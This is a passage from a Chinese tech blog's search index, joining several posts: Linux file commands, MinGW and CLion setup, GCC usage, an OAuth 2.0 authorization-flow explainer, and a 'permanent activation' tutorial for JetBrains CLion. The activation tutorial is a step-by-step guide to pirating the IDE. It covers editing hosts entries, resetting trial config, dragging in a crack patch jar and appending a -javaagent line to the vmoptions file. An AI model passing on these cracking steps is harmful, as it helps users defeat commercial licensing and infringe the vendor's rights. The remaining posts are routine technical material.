命令可以帮助用户切换工作目录。Linux 所有的目录和文件名都区分大小写。cd 命令后面可跟绝对路径，也可以跟相对路径；如果省略目录，则默认切换到当前用户的主目录。 显示当前路径 pwd使用 pwd 命令可以显示当前的工作目录，该命令很简单，直接输入 pwd 即可，后面不带参数。 查看命令位置 whichwhich 命令可以用来查看特定命令的具体位置。 12# 查看ls命令的位置$ which ls 帮助文档查看帮助文档 manman 是 Linux 提供的一个帮助手册命令，可以查看绝大部分命令、函数的使用说明。该帮助手册分成很多章节（section），使用 man 命令时可以指定不同的章节来浏览不同的内容。各个章节（section）的含义如下： 1．Standard commands（标准命令） 2．System calls（系统调用，如 open,write） 3．Library functions（库函数，如 printf,fopen） 4．Special devices（设备文件的说明，/dev 下各种设备） 5．File formats（文件格式，如 passwd） 6．Games and toys（游戏和娱乐） 7．Miscellaneous（杂项、惯例与协定等，例如 Linux 档案系统、网络协定、ASCII 码；environ 全局变量） 8．Administrative Commands（管理员命令，如 ifconfig） man 命令的使用格式是：man [选项] 命令名称，例如查看 ls 命令的用法可以使用：man 1 ls，其中 1 是数字，代表第 1 个 章节（section）。实际上，一般不用指定第几个章节也可以正常查看，例如 man ls。但是有一种情况除外，假如命令的名称和函数的名称刚好相同（如：printf），它既是命令，也可以是库函数；如果不指定章节号直接使用 man printf，那么它只能查看命令的用法，不能查看函数的用法，因为 man 命令是按照手册的章节号的顺序进行搜索的。man 命令设置了如下的功能键： 查看帮助文档 - -help--help 一般是 Linux 命令自带的选项，但并不是所有命令都自带这个选项，例如以下命令可以查看 ls 命令的帮助文档： 1$ ls --help 文件管理查看文件列表 lsls 是英文单词 list 的简写，其功能为列出目录的内容，是用户最常用的命令之一，它类似于 DOS 系统下的 dir 命令。Linux 文件或者目录名称最长可以有 256 个字符，. 代表当前目录，.. 代表上一级目录，以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示。 与 DOS 系统下的文件操作类似，在 Unix/Linux 系统中，也同样允许使用特殊字符来同时引用多个文件名，这些特殊字符被称为 通配符。 创建目录 mkdir通过 mkdir 命令可以创建一个新的目录，参数 -p 可递归创建目录。需要注意的是，新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。 123$ mkdir www$ mkdir -p www/nginx/ 删除目录 rmdir可使用 rmdir 命令删除一个目录，但必须离开目录，并且目录必须为空目录，不然会提示删除失败 删除文件 rm可通过 rm 命令删除文件或目录。使用 rm 命令要特别小心，因为文件删除后不能恢复。为了防止文件误删，可以在 rm 命令后使用 -i 参数以逐个确认要删除的文件。结合 -r 参数，可以递归删除非空目录里的所有文件和文件夹。 123$ rm run.log$ rm -rf /www/share/ 拷贝文件 cpcp 命令的功能是将给出的文件或目录复制到另一个文件或目录中，相当于 DOS 下的 copy 命令。 移动文件 mv用户可以使用 mv 命令来移动文件或目录，也可以给文件或目录重命名。 12345678# 文件重命名$ mv run.log runtime.log# 移动文件$ mv /tmp/run.log /usr/local/share/# 移动目录$ mv /tmp/share/ /usr/local/share/ 创建文件 touchtouch 命令用于修改文件或者目录的时间属性，包括存取时间和更改时间，若文件不存在，则会创建一个新的文件。命令格式为： touch [-acfm] [-d&lt;日期时间&gt;] [-r&lt;参考文件或目录&gt;] [-t&lt;日期时间&gt;] [--help] [--version][文件或目录...] -a：更改文件的读取时间记录 -m：更改文件的修改时间记录 -c：假如指定的文件不存在，不会创建新的文件，与 --no-create 的效果一样 -f：可忽略不使用，是为了与其他 Unix 系统的相容性而保留 -r：使用其他文件的时间信息，而不是当前系统时间 -d：设定时间与日期，可以使用各种不同的格式 -t：设定文件的时间信息，格式与 date 命令相同 --no-create：不创建新的文件 12# 修改文件时间属性为当前系统时间$ touch testfile 值得一提的是，使用 touch 命令时，如果指定的文件不存在，则将创建一个新的空白文件。例如，在当前目录下，使用该指令创建一个空白文件 newfile，可以使用如下命令： 1$ touch newfile 建立链接文件 lnLinux 的链接文件类似于 Windows 下的快捷方式，链接文件分为 软链接 和 硬链接: 硬链接：硬链接只能链接普通文件，不能链接目录，命令格式：ln 源文件 链接文件 软链接：软链接不占用磁盘空间，源文件删除则软链接失效，命令格式：ln -s 源文件 链接文件 1$ ln -s /bin/less /usr/local/bin/less 如果没有 -s 选项则代表建立一个硬链接文件，两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以 -s 选项是更常见的使用形式。特别注意，如果软链接文件和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。 获取文件类型 fileLinux 系统文件类型不是根据文件扩展名分类的，通过 file 命令可以确认文件的具体类型。 1$ file run.log 文件内容搜索 grepLinux 系统中的 grep 命令是一种强大的文本搜索工具，grep 命令允许对文本文件进行模式查找。如果找到匹配模式，grep 命令会打印包含模式的所有行。grep 命令的格式为 grep [-选项] "搜索内容" 文件名。 12345678# 在文件中搜索字符串$ grep "time" /tmp/run.log# 在文件中搜索字符串，不区分大小写$ grep -i "time" /tmp/run.log# 在文件中搜索字符串，不区分大小写，显示行号$ grep -i -n "time" /tmp/run.log 值得一提的是，在 grep 命令中输入字符串参数时，最好使用引号或双引号括起来，例如：grep "a" run.log。 计算文件行数或字数 wc 1234567891011 # 统计文件行数 $ wc -l run.log# 统计文件字数$ wc -w run.log# 统计文件字节数$ wc -c run.log# 统计文件字符数$ wc -m run.log 分页显示文件内容 more查看内容时，在信息过长无法在一屏上显示时，会出现快速滚屏，使得用户无法看清文件的内容。此时可以使用 more 命令，每次只显示一页，按下 空格键 可以显示下一页，按下 回车键 可以显示下一行，按下 q 键退出显示，按下 h 键可以获取帮助。 1$ more README.md 查看或者合并文件内容 cat12345# 查看文件内容$ cat 1.log# 合并文件内容$ cat 1.log 2.log &gt; 3.log 文件压缩解压 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux系统编程"},{title:"Windows 系统下 CLion 配置 MinGW",url:"/posts/60b40ee7.html",text:'MinGW 介绍MinGW 的简介MinGW 是 Minimalist GNU on Windows 的缩写。它是一个可自由使用和自由发布的 Windows 特定头文件和使用 GNU 工具集导入库的集合，允许开发者在 Linux 和 Windows 平台生成本地的 Windows 程序而不需要第三方 C 运行时（C Runtime）库。MinGW 实际上是将经典的开源 C 语言编译器 GCC 移植到了 Windows 平台下，并且包含了 Win32API 和 MSYS，因此可以将源代码编译生成 Windows 下的可执行程序，又能如同在 Linux 平台下时，使用一些 Windows 不具备的开发工具。简单一句话概况，MinGW 就是 GCC 的 Windows 版本 。 MinGW 的优势 MinGW 支持最新的 C 语言 标准 MinGW 是开源软件，可以免费使用 MinGW 由一个活跃的开源社区在持续维护，因此不会过时 MinGW 使用 Windows 的 C 语言运行库，因此编译出的程序不需要第三方 DLL ，可以直接在 Windows 下运行 那些著名的开源 IDE 实际只是将 MinGW 封装了起来，使它拥有友好的图形化界面，简化了操作，但内部核心仍然是 MinGW MinGW 是稳定可靠的、持续更新的 C/C++ 编译器，使用它可以免去很多麻烦，不用担心跟不上时代，也不用担心编译器本身有严重漏洞，可以放心的去编写程序。 MinGW 安装管理器下载 MinGW 安装管理器浏览器访问 这里，下载最新版本的 MinGW 安装管理器 mingw-get-setup.exe 安装 MinGW 安装管理器 使用系统管理员权限运行 mingw-get-setup.exe 选择 MinGW 安装管理器的安装位置 开始下载 MinGW 安装管理器，一般来说并不会花费太长时间，在数分钟范围内即可完成 MinGW 组件安装MinGW 安装管理器安装完成后，会在桌面创建一个快捷方式，以后只要双击它就可以启动 MinGW 安装管理器，这样就可以很方便地管理 MinGW 已安装的组件，或者添加安装新的组件 界面介绍一般来说，只需要一些基础组件就可以满足编译 C/C++ 程序的需求，所以选择左侧目录中的第一项 Basic Setup 即可，之后就可以在右侧选择需要的组件了 勾选组件在组件上单击鼠标右键，然后在弹出的右键菜单中单击 Mark for Installation 选项，即可将组件进行标记。在之后的操作完成后，管理器将会自动安装被标记了的组件 选择组件如果只是为了编译 C/C++ 程序，那么只需安装 mingw-developer-toolkit、mingw32-base、mingw32-gcc-g++、msys-base 这 4 个基础组件即可 应用更改在上述所需的 4 个基础组件都已勾选完成后，单击菜单栏上的 Installation 选项，并在弹出的菜单中单击 Apply Changes 选项 确认安装在弹出的确认窗口里，直接单击 Apply 按钮，之后安装管理器就会真正地开始下载和安装 MinGW 了 MinGW 安装管理器会一边下载一边安装 MinGW，这一过程可能会花费很长的时间。由于 MinGW 安装管理器连接的是国外的服务器，这会导致下载速度缓慢，所以需要耐心地等待一段时间 安装完成 检查更新 已安装组件 MinGW 环境变量配置安装目录结构MinGW 安装后，本地磁盘的目录结构如下，默认安装路径是 C:\\MinGW\\ 添加环境变量将 MinGW 安装目录下 bin 目录的路径添加到系统的环境变量中 验证环境变量在打开的命令提示符窗口中，输入 gcc -v ，然后按回车键（Enter），若控制台正确输出 GCC 的版本信息，则说明已正确配置 MinGW 的环境变量 CLion 配置 MinGWCLion 的安装可以参考本站教程：JetBrains-CLion 永久激活 创建 CMake 项目若是 C++ 项目，则选择 C++ Executable，若是 C 语言项目，则选择 C Executable，然后选择项目路径即可 配置工具链进入 CLion 工具链的配置界面，点击左侧的 + 号，环境选择 MinGW 选择 MinGW 的安装路径，一般情况下，设置好 MinGW 的安装路径后，CLion 会自动探测 CMake、Make、C Compiler 和 C++ Compiler 对应的可执行程序，但速度略慢，可等待探测完成，也可手动选择可执行文件 编译程序选中需要编译和运行的 C/C++ 源文件，然后点击 绿色箭头，这就可以编译和运行 C/C++ 程序了，程序成功运行后，会在 CLion 的输出窗口打印运行结果 参考博客 MinGW 安装教程 MinGW 离线安装包下载 Cygwin 和 MinGW 的区别与联系是怎样的 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"区块链开发知识图谱 (最新)",url:"/posts/d5d6425c.html",text:'区块链开发技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"Python 开发知识图谱 (最新)",url:"/posts/3c42fe19.html",text:'Python 就业方向 Python 开发技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"JetBrains-CLion 永久激活教程",url:"/posts/c0477083.html",text:'最新公告本文适用于 JetBrains CLion v2019.3/3.1/3.2/3.3 永久激活，若你使用的是更新的版本，建议参考这篇博客，使用最新的方式来破解。 前言JetBrains CLion 是一款专为 C/C++ 开发所设计的跨平台 IDE。本文适用 JetBrains CLion v2019.3/3.1/3.2/3.3 永久激活，附破解补丁和激活码，可以永久激活 Windows、MAC、Linux 下的 CLion！！！网上有激活码的激活方式（更改 hosts），一般都是几个月或者一年，但下面介绍的方法是永久激活，亲测可以激活成功。JetBrains CLion v2019.3.4 以及之后的版本暂时只支持默认的 License Server 激活方式，望周知。 资源下载 JetBrains CLion 下载：官网 JetBrains CLion&nbsp;破解补丁下载：本站 JetBrains CLion&nbsp;破解补丁下载：百度网盘 提取码：u3pe Clione 激活第一步更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com 第二步下载安装 JetBrains CLion，然后启动 CLion 并选择试⽤（Evaluate for free）模式进⼊软件（如下图），首次启动后的配置项根据自己的需要勾选，此步骤不会影响后面破解的过程。假设软件之前已经在试用或者试用过而且过期了，那么可以先删除 CLion 的所有配置文件，然后再重新启动软件，CLion 配置文件所在的目录如下： 123456789# Windows系统C:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\configC:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\system# Linux/Mac系统~/.CLion2019.3/config~/.CLion2019.3/system~/.config/JetBrains #此目录仅供参考，勿随便删除~/.local/share/JetBrains #此目录仅供参考，勿随便删除 (adsbygoogle = window.adsbygoogle || []).push({}); 第三步JetBrains CLion 启动后（试用模式），手动选择创建或者打开一个项目，进入到 CLion 的主界面。然后解压破解补丁压缩包（解压路径不能包含中文字符），将破解补丁文件 jetbrains-key.jar 拖进 CLion 的主界面，根据提示点击 Restart 按钮重启软件（如下图）。 第四步JetBrains CLion 重启完成后，在弹出的 JetbrainsAgent 配置助手对话框中选择对应的激活方式，然后点击安装按钮即可（如下图）。如果是⽆外网环境（银行、公安内网），请在对话框中选择 Activation code 激活方式和勾选 我⽆法访问外网的选项，一般情况下只需要选择 Activation code 激活方式即可。最后根据提示窗口，再次重启 CLion 即可完成所有破解步骤。 第五步查看是否破解成功，CLion 的菜单栏导航到 Help –&gt; About，若出现下图的信息则说明破解成功。 CLion 支持的工具链Windows 平台下，CLion 支持的工具链包括：MinGW、Cygwin、Visual Studio、WSL、Remote Host，其中 MinGW 的使用可以参考本站教程： CLion 配置 MinGW 背后的原理分析（可忽略）注：使用本文提供的破解补丁时，一定要使用上面提到的方法（拖拽破解补丁文件到 CLion 的主界面）来破解 CLion，否则破解会失败。 1234561. 将破解补丁解压目录下的important.txt、jetbrains-key.jar文件拷贝到~/.jetbrains目录~/.jetbrains/important.txt~/.jetbrains/jetbrains-agent-v3.0.3.ed81.6052. 根据操作系统的位数，找到匹配的配置文件~/.CLion2019.3/config/clion.vmoptions或者~/.CLion2019.3/config/clion64.vmoptions，然后在配置文件末尾追加如下一行内容-javaagent:~/.jetbrains/jetbrains-agent-v3.0.3.ed81.605 参考资料 CLion 如何创建并运行 C/C++ 程序 Jetbrains 系列产品 2019.3.3 最新激活方法 CLion 中创建多个 .c 文件不能运行问题及报错问题 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Linux 系统编程之二 GCC、G++ 与 GDB 的使用",url:"/posts/af282851.html",text:'GCCGCC 编译器介绍GCC（GNU Compiler Collection）编译器是 GNU 开源组织发布的 UNIX/Linux 下功能强大、性能优越的编译器，支持跨平台交叉编译，它还可以将 C、C++ 等多种语言编写的源程序编译、链接成可执行文件。而 GDB 是 GNU 推出的功能强大的程序调试器，可以说 GCC 与 GDB 是在 Linux 环境下进行 C/C++ 程序开发不可缺的工具。GCC 可以编译如 C、C++、Object-C、Java、Fortran、Pascal、Modula-3 和 Ada 等多种编程语言，而且 GCC 又是一个多平台编译器，能够在当前 CPU 平台上为多种不同体系架构的硬件平台开发软件，因此尤其适合在嵌入式软件领域的开发和编译。在使用 GCC 编译程序时，编译过程可以被细分为四个阶段：预处理、编译、汇编、链接。 GCC 使用语法介绍 语法：gcc [options] [filenames] 参数 作用 编译示例 示例说明 -o 指定输出可执行程序的名称，默认文件名为”a.out” gcc hello.c -o hello 编译单个源文件 hello.c，指定输出可执行程序的名称为 hello，支持同时编译多个源文件 -E 仅作预处理，不进行编译、汇编和链接 gcc -E hello.c -o hello.i 仅预处理源文件，指定生成中间文件 *.i，此阶段主要处理源文件中的 #ifdef、#include、#define 等预处理命令 -S 只编译到汇编语言，不进行汇编和链接，生成汇编代码 gcc -S hello.c -o hello.s 仅编译到汇编语言，指定生成汇编源文件 *.s -c 只编译、汇编到目标代码，不进行链接，生成目标文件（机器语言） gcc -c hello.s -o hello.o 根据汇编源文件 *.s，指定生成目标文件 *.o，最后根据生成的目标文件，可执行 gcc hello.o -o hello 命令生成可执行程序 -l 指定程序链接哪个静态库或者动态库 -m 表示是数学库，也就是使用 math.h 头文件 gcc hello.c -o hello -lm 编译单个源文件 hello.c，指定输出可执行程序名称为 hello，并指定程序链接到数学库 -I dir 在头文件的搜索路径列表中添加 dir 目录 -L dir 在库文件的搜索路径列表中添加 dir 目录 -O、-O2、-O3 将优化状态打开，该选项不能与”-g” 选项联合使用 -g 在生成的可执行程序中包含标准调试信息 -Wall 在发生警告时取消编译操作，即将警告看作是错误 -pedantic 严格要求代码符合 ANSI/ISO C 标准，若不符合则给出编译警告信息 -w 禁止输出所有警告 -v 打印编译器内部编译各过程的命令行信息和编译器的版本号 GCC 编译单个源文件假设有 hello.c 单个源文件，编译命令如下： gcc hello.c -o hello GCC 编译多个源文件假设有 hello.h、hello.c、main.c 三个源文件，两种编译的方式如下： 一次性编译：gcc hello.c main.c –o hello 多次独立编译（建议加上 -Wall 参数）： gcc -Wall -c main.c -o main.o gcc -Wall -c hello.c -o hello.o gcc -Wall main.o hello.o -o hello GCC 编译生成可执行文件的流程编译流程图 编译详细命令 步骤 命令 1. 预处理 gcc -E hello.c -o hello.i 2. 编译到汇编代码 gcc -S hello.c -o hello.s 3. 汇编到目标代码（机器语言） gcc -c hello.s -o hello.o 4. 链接，生成可执行文件 gcc hello.o -o hello 以上四个步骤，可以合成一个步骤，直接编译链接成可执行目标文件 gcc hello.c -o hello G++G++ 使用语法介绍 语法：g++ [options] [filenames] Make、CMake、Xmake、Automake、Autoconf、Meson 对比 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程 c语言"},{title:"Java 大数据知识图谱 (最新)",url:"/posts/9e38efb3.html",text:'基础巩固 Hadoop 生态体系 Spark 生态体系 机器学习和算法 平台架构师课程体系 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"OAuth 2.0 特性与介绍",url:"/posts/197facd0.html",text:'前言用户认证与授权 用户认证：当用户去访问我们的系统资源的时候，我们的系统需要验证用户的身份（比如账号和密码认证这是一种方式），如果身份合法则认证通过，颁发相应的免死金牌，如果验证没通过，则提示用户请三思而后行，这就是用户认证 用户授权：用户授权一般是与用户认证相辅相成的，在认证的时候，如果认证通过，我们还会将该用户的权限信息给收集起来，并将相应信息作为依据，封装在认证的 HTTP 响应体中。当用户认证成功后，访问我们系统的某一个模块的时候，该模块是需要判断该用户是否有权访问，如果没有访问该资源的访问权限，用户也只有被拒绝访问，这就是用户授权 单点登录（SSO）单点登录一般常见于分布式应用中，用户只需要登录一次，即认证一次就可访问分布式应用中的所有模块，而不需要每访问一个模块就得去登录认证一次，这样用户嫌麻烦，后端认证逻辑也冗余。 第三方登录（授权码）比如目前互联网运用中的微信登录、微博登录、支付宝登录等，用户通过授权，第三方应用给予我们系统访问他微信相关信息的权限，我们获取后进行注册，使其称为我们系统的注册人员，实现第三方登录。 OAuth 2.0 概述OAuth 2.0 简介OAuth（Open Authorization，开放授权）是为用户资源的授权定义了一个安全、开放及简单的标准，第三方无需知道用户的账号及密码，就可获取到用户的授权信息。OAuth 2.0 是 OAuth 协议的延续版本，但不向后兼容 OAuth 1.0，即完全废止了 OAuth 1.0。值得一提的是，OAuth 2.0 规定了四种获得令牌的方式，可以选择最适合自己的那一种方式向第三方应用颁发令牌，分别包括： 简化模式（implicit） 密码模式（password） 客户端模式（client_credentials） 授权码模式（authorization_code） 特别注意：不管哪一种授权模式，第三方应用申请令牌之前，都必须先到系统备案，说明自己的身份，然后会拿到两个身份识别码：客户端 ID（client id）和客户端密钥（client secret）。这是为了防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的。 OAuth 2.0 的角色OAuth 2.0 中有以下几个角色（以微信第三方登录为例）： 客户端：这个客户端和 OAuth 2.0 不沾亲带故，可以是任何独立的系统，比如我们自己的某个系统，或者某个 APP 客户端或者是 Web 客户端 资源拥有者：就是指我们的用户，比如微信登录中，在面对微信的数据库时，我们的系统就是无关人员；而登录的用户，在微信的系统中就是该用户信息的资源拥有者，他掌握着是否将他的微信个人信息暴露给我们的系统 认证服务器：在微信登录中，就是用来辨别用户的认证是否正确，是否可以成为该微信用户信息的资源拥有者；该系统由微信系统提供，用于鉴别资源拥有者的身份合法性 资源服务器：守护该微信用户信息的服务器，它掌握着微信的用户信息，我们的客户端最后就是向他发起请求，像面对甲方一样，求着它给我们响应该用户的微信个人信息 OAuth 2.0 实现第三方登录的流程以微信第三方登录为列子，具体的流程如下，点击查看流程图： 首先用户，登录我们的客户端，点击微信登录 我们的客户端请求微信的授权服务器，响应一个二维码给用户，用户扫码后点击同意 微信的授权服务器会对该微信用户进行验证 验证通过后，返回一个询问页面，是否授权给某某系统 用户点击确认，授权服务器就会颁发一个授权码给我们的客户端，并重定向我们的系统 此时我们的客户端获得授权码，根据授权码去微信的认证服务器申请令牌 微信的认证服务器认证通过后，会颁发一个令牌给我们的系统 当我们的系统拿到令牌时，也就是微信登录成功之时 该令牌代表着我们的系统，有权访问该微信用户在微信中的个人信息数据 我们的客户端携带令牌去微信的资源服务器获取该微信用户的个人信息 微信资源服务器校验该令牌的合法性，通过后响应该用户的微信个人信息数据给我们的客户端 OAuth2.0 四种授权方式授权码模式授权码模式（authorization_code）指的是第三方应用先申请一个授权码，然后再用该授权码来获取令牌。这种方式是最常用的流程，安全性也最高，它适用于那些有后端的 Web 应用。授权码通过前端传送，令牌则是储存在后端，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。 第一步，A 网站提供一个链接，用户点击后就会跳转到 B 网站，授权用户数据给 A 网站使用。下面就是 A 网站跳转 B 网站的一个示意链接。 12345https://b.com/oauth/authorize? response_type=code&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read 在上面的 URL 中，response_type 参数表示要求返回授权码（code），client_id 参数让 B 知道是谁在请求，redirect_uri 参数是 B 接受或拒绝请求后的跳转网址，scope 参数表示要求的授权范围（这里是只读）。 第二步，用户跳转后，B 网站会要求用户登录，然后询问是否同意给予 A 网站授权。用户表示同意，这时 B 网站就会跳回 redirect_uri 参数指定的网址。跳转时，会传回一个授权码，就像下面这样。 1https://a.com/callback?code=AUTHORIZATION_CODE 上面 URL 中，code 参数就是授权码。 第三步，A 网站拿到授权码以后，就可以在后端向 B 网站申请令牌。 123456https://b.com/oauth/token? client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; grant_type=authorization_code&amp; code=AUTHORIZATION_CODE&amp; redirect_uri=CALLBACK_URL 上面 URL 中，client_id 参数和 client_secret 参数用来让 B 确认 A 的身份（client_secret 参数是保密的，因此只能在后端发请求），grant_type 参数的值是 authorization_code，表示采用的授权方式是授权码，code 参数是上一步拿到的授权码，redirect_uri 参数是令牌颁发后的回调网址。 第四步，B 网站收到请求以后，就会颁发令牌。具体做法是向 redirect_uri 指定的网址，发送一段 JSON 数据。 12345678910{ "access_token":"ACCESS_TOKEN", "token_type":"bearer", "expires_in":2592000, "refresh_token":"REFRESH_TOKEN", "scope":"read", "uid":100101, "info":{...}} 上面 JSON 数据中，access_token 字段就是令牌，A 网站在后端拿到了。 简化模式有些 Web 应用是纯前端应用，没有后端。这时就不能用上面的方式了，必须将令牌储存在前端，因此 OAuth 2.0 允许直接向前端颁发令牌。这种方式没有授权码这个中间步骤，所以称为（授权码）” 简化模式（implicit）”，也叫” 隐藏模式”。 第一步，A 网站提供一个链接，要求用户跳转到 B 网站，并输入用户名和密码进行登录，下面的 URL 中，response_type 参数为 token，表示要求直接返回令牌。 12345https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read 第二步，用户成功登录后，通过以下 URL 跳转到 B 网站的授权页面，这里的 URL 不再需要 scope 参数。 1234https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL 第三步：用户同意授权用户数据给 A 网站使用，这时 B 网站就会跳回 redirect_uri 参数指定的跳转网址，并且把令牌作为 URL 参数传给 A 网站。 1https://a.com/callback#token=ACCESS_TOKEN 上面的 URL 中，token 参数就是令牌，A 网站因此直接在前端拿到令牌。注意，令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在” 中间人攻击” 的风险，而浏览器跳转时，锚点不会发到服务器，就减少了泄漏令牌的风险。 这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。 密码模式如果用户高度信任某个应用，OAuth 2.0 也允许用户把用户名和密码，直接告诉该应用。该应用就使用用户的密码，申请令牌，这种方式称为” 密码式”（password）。 第一步，A 网站要求用户提供 B 网站的用户名和密码。拿到以后，A 就直接向 B 请求令牌。下面的 URL 中，grant_type 参数是授权方式，这里的 password 表示” 密码模式”，username 和 password 是 B 的用户名和密码。 12345https://oauth.b.com/token? grant_type=password&amp; username=USERNAME&amp; password=PASSWORD&amp; client_id=CLIENT_ID 第二步，B 网站验证身份通过后，直接给出令牌。注意，这时不需要跳转，而是把令牌放在 JSON 数据里面，作为 HTTP 回应，A 因此拿到令牌。这种方式需要用户给出自己的用户名 / 密码，显然风险很大，因此只适用于其他授权方式都无法采用的情况，而且必须是用户高度信任的应用。 客户端模式客户端模式（client_credentials）也叫凭证模式，适用于没有前端的命令行应用，即在命令行下请求令牌。 第一步，A 应用在命令行向 B 发出请求。下面的 URL 中，grant_type 参数等于 client_credentials 表示采用凭证式，client_id 和 client_secret 用来让 B 确认 A 的身份。 1234https://oauth.b.com/token? grant_type=client_credentials&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET 第二步，B 网站验证通过以后，直接返回令牌。这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。 OAuth 2.0 令牌的使用携带令牌A 网站拿到令牌以后，就可以向 B 网站的 API 请求数据了。此时，每个发到 API 的请求，都必须带有令牌。具体做法是在请求的头信息，加上一个 Authorization 字段，令牌就放在这个字段里面。下面的命令中，ACCESS_TOKEN 就是拿到的令牌。 1curl -H "Authorization: Bearer ACCESS_TOKEN" "https://api.b.com" 更新令牌令牌的有效期到了，如果让用户重新走一遍上面的流程，再申请一个新的令牌，很可能体验不好，而且也没有必要。OAuth 2.0 允许用户自动更新令牌。具体方法是，B 网站颁发令牌的时候，一次性颁发两个令牌，一个用于获取数据，另一个用于获取新的令牌（refresh_token 字段）。令牌到期前，用户使用 refresh_token 发一个请求，去更新令牌。 12345https://b.com/oauth/token? grant_type=refresh_token&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; refresh_token=REFRESH_TOKEN 上面 URL 中，grant_type 参数为 refresh_token 表示要求更新令牌，client_id 参数和 client_secret 参数用于确认身份，refresh_token 参数就是用于更新令牌的令牌。B 网站验证通过以后，就会颁发新的令牌。 OAuth 2.0 与 JWT 的关系 OAuth 2.0 